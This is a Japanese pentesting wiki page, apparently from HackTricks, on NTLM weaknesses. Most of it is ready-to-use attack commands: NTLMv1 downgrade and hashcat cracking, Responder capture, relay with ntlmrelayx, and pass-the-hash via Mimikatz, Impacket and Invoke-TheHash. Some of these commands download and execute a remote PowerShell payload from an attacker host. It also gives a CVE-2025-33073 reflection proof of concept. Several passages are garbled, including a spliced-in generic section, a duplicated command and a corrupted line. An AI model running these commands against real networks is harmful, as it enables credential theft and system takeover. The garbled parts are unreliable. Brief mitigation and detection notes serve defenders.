# NTLM

{{#include ../../banners/hacktricks-training.md}}


## 基本情報

**Windows XP と Server 2003** が動作している環境では、LM (Lan Manager) ハッシュが利用されますが、これらは簡単に侵害されることで広く知られています。特定の LM ハッシュ `AAD3B435B51404EEAAD3B435B51404EE` は、LM が使用されていないことを示し、空文字列のハッシュを表します。

デフォルトでは、**Kerberos** 認証プロトコルが主要な方法として使用されます。NTLM (NT LAN Manager) は、Active Directory が存在しない、domain が存在しない、設定不備により Kerberos が動作しない、または有効な hostname ではなく IP アドレスを使って接続が試みられる場合など、特定の状況で使用されます。

ネットワークパケット内に **"NTLMSSP"** ヘッダーが存在することは、NTLM 認証プロセスが行われていることを示します。

認証プロトコル - LM、NTLMv1、NTLMv2 - のサポートは、`%windir%\Windows\System32\msv1\_0.dll` にある特定の DLL によって提供されます。

**要点**:

- LM ハッシュは脆弱であり、空の LM ハッシュ (`AAD3B435B51404EEAAD3B435B51404EE`) は未使用を示す。
- Kerberos がデフォルトの認証方法であり、NTLM は特定の条件下でのみ使用される。
- NTLM 認証パケットは "NTLMSSP" ヘッダーで識別できる。
- LM、NTLMv1、NTLMv2 プロトコルはシステムファイル `msv1\_0.dll` によってサポートされる。

## LM, NTLMv1 and NTLMv2

どのプロトコルが使用されるかを確認・設定できます:

### GUI

_execute_ _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. 6 つのレベルがあります (0 から 5 まで)。

![](<../../images/image (919).png>)

### Registry

これは level 5 を設定します:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
可能な値:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **ユーザー**が**認証情報**を入力する
2. クライアントマシンが**認証リクエストを送信**し、**ドメイン名**と**ユーザー名**を送る
3. **サーバー**が**challenge**を送る
4. **クライアントが challenge を暗号化**し、パスワードの hash を key として使って response として送る
5. **サーバーが Domain controller に** **ドメイン名、ユーザー名、challenge、response** を送る。Active Directory が設定されていない、またはドメイン名がサーバー名の場合は、認証情報は**ローカルで確認**される。
6. **Domain controller がすべて正しいか確認**し、その情報をサーバーに送る

**サーバー**と**Domain Controller**は、Domain Controller がサーバーのパスワードを知っているため（**NTDS.DIT** db に保存されている）、**Netlogon** server 経由で **Secure Channel** を作成できる。

### Local NTLM authentication Scheme

認証は**上で述べたものと同じ**だが、**サーバー**は **SAM** file 内で認証しようとするユーザーの hash を知っている。なので、Domain Controller に問い合わせる代わりに、**サーバー自身が**そのユーザーが認証できるかを確認する。

### NTLMv1 Challenge

**challenge の長さは 8 bytes** で、**response の長さは 24 bytes**。

**NT hash (16bytes)** は **7bytes ずつの 3 つの部分**に分割される（7B + 7B + (2B+0x00\*5)）: **最後の部分はゼロで埋められる**。その後、**challenge** は各部分ごとに**別々に暗号化**され、**得られた**暗号化済み bytes を**結合**する。合計: 8B + 8B + 8B = 24Bytes。

**Problems**:

- **ランダム性**の欠如
- 3 つの部分を**別々に攻撃**して NT hash を見つけられる
- **DES は crackable**
- 3º key は常に **5 zeros** で構成される。
- **同じ challenge** なら**response** も**同じ**になる。なので、被害者への **challenge** として文字列 "**1122334455667788**" を与え、**事前計算済みの rainbow tables** を使って response を攻撃できる。

### NTLMv1 attack

現在では、Unconstrained Delegation が設定された環境を見つけることは以前より少なくなっているが、これは設定された **Print Spooler service** を**悪用できない**という意味ではない。

すでに AD 上で持っている認証情報/セッションを悪用して、プリンターに**自分が管理する host** に対して認証するよう**要求**できる。次に、`metasploit auxiliary/server/capture/smb` または `responder` を使って、**authentication challenge を 1122334455667788 に設定**し、認証試行をキャプチャする。もしそれが **NTLMv1** を使って行われていれば、**crack できる**。\
`responder` を使っているなら、**flag `--lm`** を使って **authentication** の**downgrade** を試せる。\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

プリンターは認証時にコンピューターアカウントを使うことを覚えておいてほしい。コンピューターアカウントは**長くてランダムなパスワード**を使うため、一般的な**dictionaries** では**おそらく crack できない**。しかし **NTLMv1** 認証は **DES** を使うため（[more info here](#ntlmv1-challenge)）、DES の crack に特化したサービスを使えば crack できる（たとえば [https://crack.sh/](https://crack.sh) や [https://ntlmv1.com/](https://ntlmv1.com) を使える）。

### NTLMv1 attack with hashcat

NTLMv1 は NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) でも破ることができ、これは NTLMv1 messages を hashcat で破れる形式に整形する。

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
以下を出力する:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
hashcat を実行してください（hashtopolis のようなツールを使った分散実行が最適です）。そうしないと、これには数日かかります。
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
この場合、これのパスワードは password だと分かっているので、デモ目的で cheating します:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
ここで、crackedされたdes keysをNTLM hashの一部に変換するために hashcat-utilities を使う必要があります:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
最後に最後の部分:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM

NTLM (NT LAN Manager) は、もともと Microsoft によって開発された認証プロトコルで、現在も Windows 環境で広く使われています。相互認証を提供しないため、Kerberos より弱く、[pass-the-hash](https://attack.mitre.org/techniques/T1550/002/) などの攻撃に対して脆弱です。

### ハッシュを盗む

NTLM を悪用する最も一般的な方法の1つは、ユーザーのハッシュを盗むことです。これは、認証を要求するように設定された SMB サーバーや、画像や文書などの読み込み時に外部リソースを要求するファイルを用いて行えます。

```bash
# Responder を使って NTLM ハッシュをキャプチャする
responder -I eth0
```

### リレー攻撃

NTLM リレーは、盗んだ NTLM 認証データを別のサービスに転送して、認証済みセッションを確立する手法です。これにより、攻撃者は資格情報を知らなくても権限を得られます。

```bash
# ntlmrelayx を使って SMB へのリレー
ntlmrelayx.py -t smb://192.168.1.10
```

### 予防策

- NTLM を無効化し、Kerberos を優先する
- SMB サインニングを有効にする
- LDAP サインニングとチャネルバインディングを有効にする
- 管理者権限の使用を制限する
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**challenge lengthは8 bytes**で、**2つの response**が送信されます: 1つは**24 bytes**で、**もう1つ**の長さは**variable**です。

**最初の response**は、**client と domain**で構成された**string**を **HMAC_MD5** で ciphering し、**key** として **NT hash** の **MD4 hash** を使って作成されます。次に、その**result**を **key** として使い、**HMAC_MD5** で **challenge** を ciphering します。これに **8 bytes の client challenge** が追加されます。合計: 24 B。

**2つ目の response**は、**several values**（新しい client challenge、**timestamp** など、**replay attacks** を避けるためのもの）を使って作成されます。

**successful authentication process** をキャプチャした **pcap** がある場合、このガイドに従って **domain**, **username**, **challenge** と **response** を取得し、password を creak してみてください: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**victim の hash を入手したら**、それを使って **impersonate** できます。\
その hash を使って **NTLM authentication** を実行する **tool** を使うか、**new sessionlogon** を作成してその hash を **LSASS** に **inject** し、以後 **NTLM authentication** が実行されるたびに、その hash が使われるようにできます。最後の方法が mimikatz の動作です。

**覚えておいてください: Computer accounts を使っても Pass-the-Hash attacks を実行できます。**

### **Mimikatz**

**administrator として実行する必要があります**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
これは、mimikatz を起動したユーザーに属するプロセスを起動しますが、LSASS 内では保存された認証情報は mimikatz のパラメータ内のものになります。すると、そのユーザーであるかのようにネットワークリソースへアクセスできます（`runas /netonly` のトリックに似ていますが、平文パスワードを知る必要はありません）。

### Pass-the-Hash from linux

Linux から Windows マシンで Pass-the-Hash を使ってコード実行を行えます。\
[**Access here to learn how to do it.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

[Windows 用の impacket バイナリはこちらからダウンロードできます](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries)。

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** （この場合はコマンドを指定する必要があります。cmd.exe と powershell.exe は、対話的シェルを取得するためには有効ではありません）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- 他にもいくつかの Impacket バイナリがあります...

### Invoke-TheHash

powershell スクリプトはここから入手できます: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

この関数は、**他のすべてを組み合わせたもの**です。**複数のホスト**を渡したり、一部を**除外**したり、使いたい**オプション**を選択できます（_SMBExec、WMIExec、SMBClient、SMBEnum_）。**SMBExec** と **WMIExec** のどちらかを選んでも、_**Command**_ パラメータを**与えない**場合は、**十分な権限**があるかどうかを**確認**するだけです。
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**管理者として実行する必要があります**

このツールは mimikatz と同じことを行います（LSASS メモリを変更します）。
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### ユーザー名とパスワードを使った Windows の手動リモート実行


{{#ref}}
../lateral-movement/
{{#endref}}

## Windows Host からの認証情報の抽出

**より詳しくは** [**Windows host から認証情報を取得する方法についてはこのページを読むべきです**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**。**

## Internal Monologue attack

Internal Monologue Attack は、攻撃者が LSASS process と直接やり取りすることなく、被害者の machine から NTLM hashes を取得できる、ステルス性の高い認証情報抽出 technique です。Mimikatz は memory から hashes を直接読み取り、endpoint security solutions や Credential Guard によって頻繁にブロックされますが、この attack は **Security Support Provider Interface (SSPI)** を介した **NTLM authentication package (MSV1_0) への local calls** を利用します。攻撃者はまず、NTLM settings（例: LMCompatibilityLevel、NTLMMinClientSec、RestrictSendingNTLMTraffic）を **downgrade** して NetNTLMv1 が許可されるようにします。次に、実行中の process から取得した既存の user token を impersonate し、既知の challenge を使って local で NTLM authentication を発生させ、NetNTLMv1 response を生成させます。

この NetNTLMv1 response を取得した後、攻撃者は **事前計算された rainbow tables** を使って元の NTLM hashes をすばやく復元でき、さらに lateral movement のための Pass-the-Hash attacks へつなげられます。重要なのは、Internal Monologue Attack は network traffic を生成せず、code injection も行わず、直接的な memory dump も引き起こさないため、Mimikatz のような従来手法と比べて defenders に検知されにくい点です。

NetNTLMv1 が受け入れられない場合、つまり security policies によって拒否されている場合は、攻撃者は NetNTLMv1 response を取得できないことがあります。

このケースに対応するため、Internal Monologue tool は更新されました。`AcceptSecurityContext()` を使って server token を動的に取得し、NetNTLMv1 が失敗した場合でも **NetNTLMv2 responses を capture** できるようになっています。NetNTLMv2 ははるかに crack しにくいですが、限定的なケースでは relay attacks や offline brute-force への道を開きます。

PoC は **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)** にあります。

## NTLM Relay and Responder

**これらの attacks を実行する方法についてのより詳しい guide はここを読んでください:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## ネットワークキャプチャから NTLM challenges を解析する

**次を使えます** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## Serialized SPNs を介した NTLM & Kerberos の *Reflection* (CVE-2025-33073)

Windows には、NTLM（または Kerberos）authentication が host から発生し、**同じ** host に relay されて SYSTEM privileges を得る *reflection* attacks を防ぐための複数の mitigation があります。

Microsoft は MS08-068 (SMB→SMB)、MS09-013 (HTTP→SMB)、MS15-076 (DCOM→DCOM) とその後の patches で主要な public chains を壊しましたが、**CVE-2025-33073** は、**SMB client が *marshalled*（serialized）target-info を含む Service Principal Names (SPNs) を切り詰める** 仕組みを悪用することで、保護をまだ bypass できることを示しています。

### バグの TL;DR
1. 攻撃者は、marshalled SPN をエンコードした **DNS A-record** を登録する。例:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. 被害者は、その hostname へ認証するよう強制される（PetitPotam、DFSCoerce など）。
3. SMB client が target string `cifs/srv11UWhRCAAAAA…` を `lsasrv!LsapCheckMarshalledTargetInfo` に渡すと、`CredUnmarshalTargetInfo` への call により serialized blob が **取り除かれ**、**`cifs/srv1`** が残る。
4. `msv1_0!SspIsTargetLocalhost`（または Kerberos の同等処理）は、short host part が computer name (`SRV1`) と一致するため、target を *localhost* と判断する。
5. その結果、server は `NTLMSSP_NEGOTIATE_LOCAL_CALL` を設定し、**LSASS の SYSTEM access-token** を context に注入する（Kerberos では SYSTEM が付与された subsession key が作成される）。
6. `ntlmrelayx.py` **または** `krbrelayx.py` でこの authentication を relay すると、同じ host 上で完全な SYSTEM rights を得られる。

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* KB patch for **CVE-2025-33073** は `mrxsmb.sys::SmbCeCreateSrvCall` にチェックを追加し、marshalled info を含む任意の SMB connection をブロックする (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`)。
* **SMB signing** を強制して、未パッチの host でも reflection を防ぐ。
* `*<base64>...*` に似た DNS records を監視し、coercion vectors（PetitPotam、DFSCoerce、AuthIP...）をブロックする。

### Detection ideas
* client IP ≠ server IP の `NTLMSSP_NEGOTIATE_LOCAL_CALL` を含む network captures。
* subsession key を含み、client principal が hostname と等しい Kerberos AP-REQ。
* 直後に同じ host から remote SMB writes が続く Windows Event 4624/4648 SYSTEM logons。

**March 2026** の local reflection variant で **SMB arbitrary ports** と **TCP connection reuse** を悪用して `NT AUTHORITY\SYSTEM` に到達するものについては、以下を参照:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
